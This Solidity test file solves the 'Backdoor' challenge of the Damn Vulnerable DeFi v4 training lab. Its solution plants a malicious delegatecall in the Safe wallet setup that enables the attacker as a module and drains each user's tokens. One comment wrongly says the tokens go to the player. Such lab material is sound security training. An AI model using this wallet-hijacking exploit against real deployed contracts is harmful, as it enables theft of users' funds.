// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {Enum} from "@safe-global/safe-smart-account/contracts/common/Enum.sol";
import {IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(bytes4(hex"82b42900")); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        MaliciousInstaller attack = new MaliciousInstaller();
        for(uint8 i = 0; i < 4; ++i) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];
            uint256 threshold = 1;
            address to = address(attack);
            bytes memory data = abi.encodeWithSignature("install(address)", player);
            address fallbackHandler = address(0);
            address paymentToken = address(0);
            uint256 payment = 0;
            address paymentReceiver = address(0);
            bytes memory initializer =  abi.encodeWithSelector(
                Safe.setup.selector, 
                owners, 
                threshold, 
                to, 
                data, 
                fallbackHandler, 
                paymentToken, 
                payment, 
                paymentReceiver
            );
            uint256 saltNonce = 100;
            IProxyCreationCallback callback = IProxyCreationCallback(address(walletRegistry));    
            SafeProxy proxy = walletFactory.createProxyWithCallback(address(singletonCopy), initializer, saltNonce, IProxyCreationCallback(callback));
            bytes memory drainData = abi.encodeWithSignature(
                "transfer(address,uint256)", 
                recovery, 
                10e18 // 10 DVT
            );

            // Call execTransactionFromModule ON THE PROXY, not the Factory
            bool success = Safe(payable(address(proxy))).execTransactionFromModule(
                address(token),      // Target: the DVT token contract
                0,                   // Value: 0 (we are moving ERC20s)
                drainData,           // Data: transfer 10 DVT to player
                Enum.Operation.Call  // Operation: Normal Call
            );
            
            require(success, "Drain failed");
        } 
    }
        
    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
    
}

contract MaliciousInstaller {
    constructor() {}
    function install(address player) external {
        // We are in a delegatecall context, so address(this) is the Safe proxy
        // We call the Safe's own enableModule function
        (bool success, ) = address(this).call(
            abi.encodeWithSignature("enableModule(address)", player)
        );
        require(success, "Install failed");
    }
}